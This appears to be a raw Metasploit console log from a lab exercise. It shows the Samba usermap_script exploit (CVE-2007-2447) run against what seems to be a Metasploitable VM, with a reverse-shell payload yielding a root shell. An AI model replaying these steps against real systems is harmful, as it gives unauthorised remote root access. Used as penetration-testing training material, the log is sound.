@@ -1,0 +1,249 @@
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+                                                  
+                                              `:oDFo:`                            
+                                           ./ymM0dayMmy/.                          
+                                        -+dHJ5aGFyZGVyIQ==+-                    
+                                    `:sm⏣~~Destroy.No.Data~~s:`                
+                                 -+h2~~Maintain.No.Persistence~~h+-              
+                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
+                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
+                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
+                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
+                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
+                      :we're.all.alike'`                     The.PFYroy.No.D7:  
+                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
+                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
+                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
+                      :<script>.Ac816/                        sENbove3101.404:    
+                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
+                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
+                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
+                      :#OUTHOUSE-  -s:                       /corykennedyData:    
+                      :$nmap -oS                              SSo.6178306Ence:    
+                      :Awsm.da:                            /shMTl#beats3o.No.:    
+                      :Ring0:                             `dDestRoyREXKC3ta/M:    
+                      :23d:                               sSETEC.ASTRONOMYist:    
+                       /-                        /yo-    .ence.N:(){ :|: & };:    
+                                                 `:Shall.We.Play.A.Game?tron/    
+                                                 ```-ooy.if1ghtf0r+ehUser5`    
+                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
+                                              `MjM~~WE.ARE.se~~MMjMs              
+                                               +~KANSAS.CITY's~-`                  
+                                                J~HAKCERS~./.`                    
+                                                .esc:wq!:`                        
+                                                 +++ATH`                            
+                                                  `
+
+
+       =[ metasploit v6.3.4-dev                           ]
++ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: You can use help to view all 
+available commands
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > 
+msf6 auxiliary(scanner/smb/smb_version) > set rhost 192.168.1.37
+rhost => 192.168.1.37
+msf6 auxiliary(scanner/smb/smb_version) > search cve:2007-2447
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+msf6 auxiliary(scanner/smb/smb_version) > use exploit/multi/samba/usermap_script
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > use payload exploit/multi/samba/usermap_script
+[-] No results from search
+[-] Failed to load module: payload
+msf6 exploit(multi/samba/usermap_script) > use exploit/multi/samba/usermap_script
+[*] Using configured payload cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
+                                      asics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.38     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/samba/usermap_script) > set rhost 192.168.1.37
+rhost => 192.168.1.37
+msf6 exploit(multi/samba/usermap_script) > set rport 445
+rport => 445
+msf6 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.1.37     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
+                                      asics/using-metasploit.html
+   RPORT   445              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.38     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/samba/usermap_script) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/cmd/unix/bind_awk                                    normal  No     Unix Command Shell, Bind TCP (via AWK)
+   1   payload/cmd/unix/bind_busybox_telnetd                        normal  No     Unix Command Shell, Bind TCP (via BusyBox telnetd)
+   2   payload/cmd/unix/bind_inetd                                  normal  No     Unix Command Shell, Bind TCP (inetd)
+   3   payload/cmd/unix/bind_jjs                                    normal  No     Unix Command Shell, Bind TCP (via jjs)
+   4   payload/cmd/unix/bind_lua                                    normal  No     Unix Command Shell, Bind TCP (via Lua)
+   5   payload/cmd/unix/bind_netcat                                 normal  No     Unix Command Shell, Bind TCP (via netcat)
+   6   payload/cmd/unix/bind_netcat_gaping                          normal  No     Unix Command Shell, Bind TCP (via netcat -e)
+   7   payload/cmd/unix/bind_netcat_gaping_ipv6                     normal  No     Unix Command Shell, Bind TCP (via netcat -e) IPv6
+   8   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
+   9   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   10  payload/cmd/unix/bind_r                                      normal  No     Unix Command Shell, Bind TCP (via R)
+   11  payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
+   12  payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   13  payload/cmd/unix/bind_socat_udp                              normal  No     Unix Command Shell, Bind UDP (via socat)
+   14  payload/cmd/unix/bind_zsh                                    normal  No     Unix Command Shell, Bind TCP (via Zsh)
+   15  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
+   16  payload/cmd/unix/pingback_bind                               normal  No     Unix Command Shell, Pingback Bind TCP (via netcat)
+   17  payload/cmd/unix/pingback_reverse                            normal  No     Unix Command Shell, Pingback Reverse TCP (via netcat)
+   18  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
+   19  payload/cmd/unix/reverse_awk                                 normal  No     Unix Command Shell, Reverse TCP (via AWK)
+   20  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   21  payload/cmd/unix/reverse_jjs                                 normal  No     Unix Command Shell, Reverse TCP (via jjs)
+   22  payload/cmd/unix/reverse_ksh                                 normal  No     Unix Command Shell, Reverse TCP (via Ksh)
+   23  payload/cmd/unix/reverse_lua                                 normal  No     Unix Command Shell, Reverse TCP (via Lua)
+   24  payload/cmd/unix/reverse_ncat_ssl                            normal  No     Unix Command Shell, Reverse TCP (via ncat)
+   25  payload/cmd/unix/reverse_netcat                              normal  No     Unix Command Shell, Reverse TCP (via netcat)
+   26  payload/cmd/unix/reverse_netcat_gaping                       normal  No     Unix Command Shell, Reverse TCP (via netcat -e)
+   27  payload/cmd/unix/reverse_openssl                             normal  No     Unix Command Shell, Double Reverse TCP SSL (openssl)
+   28  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   29  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   30  payload/cmd/unix/reverse_php_ssl                             normal  No     Unix Command Shell, Reverse TCP SSL (via php)
+   31  payload/cmd/unix/reverse_python                              normal  No     Unix Command Shell, Reverse TCP (via Python)
+   32  payload/cmd/unix/reverse_python_ssl                          normal  No     Unix Command Shell, Reverse TCP SSL (via python)
+   33  payload/cmd/unix/reverse_r                                   normal  No     Unix Command Shell, Reverse TCP (via R)
+   34  payload/cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
+   35  payload/cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   36  payload/cmd/unix/reverse_socat_udp                           normal  No     Unix Command Shell, Reverse UDP (via socat)
+   37  payload/cmd/unix/reverse_ssh                                 normal  No     Unix Command Shell, Reverse TCP SSH
+   38  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+   39  payload/cmd/unix/reverse_tclsh                               normal  No     Unix Command Shell, Reverse TCP (via Tclsh)
+   40  payload/cmd/unix/reverse_zsh                                 normal  No     Unix Command Shell, Reverse TCP (via Zsh)
+
+msf6 exploit(multi/samba/usermap_script) > set payload/cmd/unix/reverse
+[-] Unknown datastore option: payload/cmd/unix/reverse.
+Usage: set [options] [name] [value]
+
+Set the given option to value.  If value is omitted, print the current value.
+If both are omitted, print options that are currently set.
+
+If run from a module context, this will set the value in the module's
+datastore.  Use -g to operate on the global datastore.
+
+If setting a PAYLOAD, this command can take an index from `show payloads'.
+
+OPTIONS:
+
+    -g, --global  Operate on global datastore variables
+
+msf6 exploit(multi/samba/usermap_script) > set payload /cmd/unix/reverse
+payload => cmd/unix/reverse
+msf6 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.1.37     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
+                                      sics/using-metasploit.html
+   RPORT   445              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.38     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP double handler on 192.168.1.38:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo 8oTlqNSxJNmDZws7;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "8oTlqNSxJNmDZws7\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.1.38:4444 -> 192.168.1.37:50404) at 2023-07-30 15:48:27 -0400
+
+whaomi
+sh: line 7: whaomi: command not found
+whoami
+root
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
